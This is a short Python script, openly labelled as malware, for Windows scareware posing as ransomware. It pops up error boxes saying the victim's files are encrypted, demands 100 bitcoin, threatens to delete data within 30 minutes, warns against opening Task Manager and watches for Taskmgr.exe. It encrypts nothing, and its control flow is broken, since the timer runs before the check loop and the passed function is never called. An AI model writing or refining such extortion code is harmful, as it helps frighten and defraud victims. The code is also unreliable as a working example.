# Importing Modules
from tkinter import messagebox 
import wmi
import time

# Defining Classes and methods
class malware:
    checking_sys = wmi.WMI()
    process_lis =[]

    def check(self,func):
        
        while True:
            for process in self.checking_sys.Win32_Process():
                self.process_lis.append(process.name)
            if "Taskmgr.exe" in self.process_lis:
                print("Exit")
                
            else:
                func
                
            self.process_lis =[]
    
    messages = ["Your all files are encrypted now",
                "Send me 100 bitcoin otherwise I'll delete your all data",
                "Each wrong password will increase 50 Bitcoins",
                "You have only 30 minutes",
                "After that I'll delete all data.",
                "Don't try to open task manager"]
    def __init__(self):
        for items in self.messages:
            messagebox.showerror("Error",items)
    
    def timer(self):
        delay = 1800
        while delay > 0:
            time.sleep(1)
            print(delay)
            delay -= 1
            
# Calling class methods & making Object

target = malware()  
target.check(target.timer())
# target.timer()